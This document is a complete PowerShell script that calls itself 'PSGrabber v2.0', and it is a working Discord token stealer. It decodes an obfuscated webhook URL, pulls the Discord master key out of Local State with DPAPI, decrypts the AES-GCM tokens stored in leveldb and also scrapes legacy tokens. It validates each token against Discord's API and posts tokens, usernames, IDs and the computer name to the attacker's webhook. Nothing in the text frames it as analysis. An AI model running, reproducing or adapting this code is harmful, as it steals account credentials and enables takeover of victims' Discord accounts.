$e = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMTYxMjkzNTIzODI1ODY4OC96MEVFSU1lN0x5THdIMmYzb0R6TGk0YTd4Ml8zeGg0bS1YTEp4b1BUaW1UYmlOQkVYRk1wOW5ZY2l6WFpqeDZURjRzNw=="
$hookUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e))

Add-Type -AssemblyName System.Security, System.Web.Extensions

# AES-GCM Decryption Helper for PS 5.1
$code = @"
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

public class AesGcmDecrypter {
    [StructLayout(LayoutKind.Sequential)]
    public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable {
        public int cbStruct;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;

        public void Dispose() {
            if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce);
            if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag);
        }
    }

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    public static extern uint BCryptSetProperty(IntPtr hObject, string pszProperty, string pbInput, int cbInput, uint dwFlags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    public static extern uint BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, uint dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern uint BCryptDestroyKey(IntPtr hKey);

    public static byte[] Decrypt(byte[] key, byte[] iv, byte[] tag, byte[] ciphertext) {
        IntPtr hAlg = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();

        try {
            uint status = BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
            if (status != 0) return null;

            status = BCryptSetProperty(hAlg, "ChainingMode", "ChainingModeGCM", "ChainingModeGCM".Length * 2, 0);
            if (status != 0) return null;

            status = BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
            if (status != 0) return null;

            authInfo.cbStruct = Marshal.SizeOf(authInfo);
            authInfo.dwInfoVersion = 1;
            authInfo.pbNonce = Marshal.AllocHGlobal(iv.Length);
            Marshal.Copy(iv, 0, authInfo.pbNonce, iv.Length);
            authInfo.cbNonce = iv.Length;
            authInfo.pbTag = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(tag, 0, authInfo.pbTag, tag.Length);
            authInfo.cbTag = tag.Length;

            byte[] plaintext = new byte[ciphertext.Length];
            int cbResult = 0;
            status = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref authInfo, null, 0, plaintext, plaintext.Length, out cbResult, 0);

            if (status != 0) return null;
            return plaintext;
        } finally {
            authInfo.Dispose();
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
        }
    }
}
"@

Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue

function Get-MasterKey($path) {
    if (Test-Path $path) {
        try {
            $json = Get-Content $path -Raw | ConvertFrom-Json
            $encryptedKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
            return [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        } catch {}
    }
    return $null
}

function Decrypt-Token($token, $masterKey) {
    try {
        $bytes = [Convert]::FromBase64String($token.Substring(12))
        $iv = $bytes[3..14]
        $ciphertext = $bytes[15..($bytes.Length - 17)]
        $tag = $bytes[($bytes.Length - 16)..($bytes.Length - 1)]
        $decrypted = [AesGcmDecrypter]::Decrypt($masterKey, $iv, $tag, $ciphertext)
        if ($null -ne $decrypted) {
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        }
    } catch {}
    return $null
}

$possibleTokens = @()
$discordPaths = @{
    "Discord"        = "$env:APPDATA\discord"
    "Discord Canary" = "$env:APPDATA\discordcanary"
    "Discord PTB"    = "$env:APPDATA\discordptb"
}

foreach ($entry in $discordPaths.GetEnumerator()) {
    $name = $entry.Key
    $path = $entry.Value
    $leveldb = Join-Path $path "Local Storage\leveldb"
    $localState = Join-Path $path "Local State"

    if (Test-Path $leveldb) {
        $masterKey = Get-MasterKey $localState
        $files = Get-ChildItem -Path $leveldb -Filter "*.ldb"
        foreach ($file in $files) {
            $content = Get-Content $file.FullName -Raw -Encoding Default
            
            # Find encrypted tokens
            $matches = [regex]::Matches($content, 'dQw4w9WgXcQ:[^"]*')
            foreach ($match in $matches) {
                $token = $match.Value.TrimEnd('"').TrimEnd(' ')
                if ($masterKey) {
                    $decrypted = Decrypt-Token $token $masterKey
                    if ($decrypted) {
                        try {
                            $r = Invoke-WebRequest https://discord.com/api/v9/users/@me -Headers @{"Authorization" = $decrypted} -UseBasicParsing -ErrorAction SilentlyContinue
                            if ($r.StatusCode -eq 200) {
                                $userData = $r.Content | ConvertFrom-Json
                                $user = "$($userData.username)#$($userData.discriminator)"
                                $possibleTokens += [PSCustomObject]@{
                                    Type     = "Encrypted"
                                    Location = $name
                                    Token    = $decrypted
                                    User     = $user
                                    ID       = $userData.id
                                }
                            }
                        } catch {}
                    }
                }
            }

            # Find legacy tokens
            $matches = [regex]::Matches($content, '[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}')
            foreach ($match in $matches) {
                $token = $match.Value
                try {
                    $r = Invoke-WebRequest https://discord.com/api/v9/users/@me -Headers @{"Authorization" = $token} -UseBasicParsing -ErrorAction SilentlyContinue
                    if ($r.StatusCode -eq 200) {
                        $userData = $r.Content | ConvertFrom-Json
                        $user = "$($userData.username)#$($userData.discriminator)"
                        $possibleTokens += [PSCustomObject]@{
                            Type     = "Legacy"
                            Location = $name
                            Token    = $token
                            User     = $user
                            ID       = $userData.id
                        }
                    }
                } catch {}
            }
        }
    }
}

if ($possibleTokens.Count -gt 0) {
    $uniqueTokens = $possibleTokens | Select-Object -Unique Token, User, ID, Type, Location
    $embeds = @()
    foreach ($t in $uniqueTokens) {
        $tokenCodeBlock = '```' + $t.Token + '```'
        $embeds += @{
            title = "Discord Token Decrypted"
            color = 5814783 # Discord Purple
            fields = @(
                @{ name = "User"; value = "``$($t.User)``"; inline = $true }
                @{ name = "ID"; value = "``$($t.ID)``"; inline = $true }
                @{ name = "Location"; value = $t.Location; inline = $true }
                @{ name = "Token (Click to copy)"; value = $tokenCodeBlock; inline = $false }
            )
            footer = @{ text = "PSGrabber v2.0 | $env:COMPUTERNAME" }
            timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
        }
    }
    
    # Split into chunks of 10 embeds (Discord limit)
    for ($i = 0; $i -lt $embeds.Count; $i += 10) {
        $end = [Math]::Min($i + 9, $embeds.Count - 1)
        $chunk = $embeds[$i..$end]
        $payload = @{ embeds = $chunk }
        $json = $payload | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $hookUrl -Method Post -Body $json -ContentType "Application/Json"
    }
    
    Write-Host "Sent $($uniqueTokens.Count) tokens to webhook with rich formatting."
} else {
    $payload = @{
        embeds = @(@{
            title = "Status Report"
            description = "No valid Discord tokens were found on this system."
            color = 16711680 # Red
            footer = @{ text = "PSGrabber v2.0 | $env:COMPUTERNAME" }
            timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
        })
    }
    $json = $payload | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body $json -ContentType "Application/Json"
    Write-Host "No tokens found. Sent status report to webhook."
}
